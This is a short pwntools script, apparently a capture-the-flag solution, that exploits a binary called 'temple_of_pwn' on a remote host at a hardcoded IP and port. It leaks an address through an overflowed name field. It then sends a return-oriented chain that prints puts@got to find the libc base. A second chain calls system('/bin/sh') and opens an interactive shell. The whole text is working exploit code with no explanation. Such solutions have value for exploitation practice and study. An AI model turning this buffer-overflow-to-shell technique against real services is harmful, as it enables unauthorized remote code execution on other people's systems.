from pwn import *

elf = ELF("./temple_of_pwn")
libc = ELF("./libc-2.33.so")

#p = elf.process()
p = remote('45.122.249.68', 10005)
p.recvuntil("Enter your name: ")
p.recvline()

payload = b"A"*32

p.sendline(payload)
p.recvuntil(b"A"*32)
leak = u64(p.recvuntil(b"Now",drop=True).ljust(8,b"\x00"))
log.info("Leak: "+ hex(leak))

pop_rdi = 0x4014a3
ret = pop_rdi + 1

p.sendline("1")

p.sendlineafter(b"Length of your whisper:",str(leak+1))

payload1 = b"A"*40
payload1 += p64(pop_rdi)
payload1 += p64(elf.got['puts'])
payload1 += p64(elf.sym['puts'])
payload1 += p64(elf.sym['next_step'])

p.sendafter(b"You good. It's time to get the reward!",payload1)

p.recvuntil("Bye\n")
leak = u64(p.recvuntil("\n",drop=True).ljust(8,b"\x00"))
libc.address = leak - libc.sym['puts']
log.info("Libc base: " + hex(libc.address))

bin_sh = next(libc.search(b'/bin/sh'))
log.info("Bin_sh: "+ hex(bin_sh))

payload2 = b"A"*40
payload2 += p64(pop_rdi)
payload2 += p64(bin_sh)
payload2 += p64(ret)
payload2 += p64(libc.sym['system'])

p.sendafter(b"You good. It's time to get the reward!", payload2)

p.interactive()
